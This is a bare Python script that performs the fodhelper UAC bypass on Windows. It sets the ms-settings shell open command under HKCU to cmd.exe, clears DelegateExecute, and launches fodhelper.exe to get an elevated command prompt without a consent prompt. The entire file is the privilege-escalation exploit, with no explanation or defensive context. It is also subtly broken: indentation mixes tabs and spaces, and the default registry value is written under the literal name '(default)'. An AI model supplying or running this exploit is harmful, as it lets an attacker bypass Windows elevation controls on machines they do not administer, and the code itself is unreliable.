import winreg, os

def main():
	Command = r"C:\Windows\System32\cmd.exe"
	
	set_reg("DelegateExecute", "")
	set_reg("(default)", Command)
	
	# Run  C:\Windows\System32\fodhelper.exe
	os.system(r"C:\Windows\System32\fodhelper.exe")

def set_reg(name, value):
	REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False

if __name__ == "__main__":
    main()
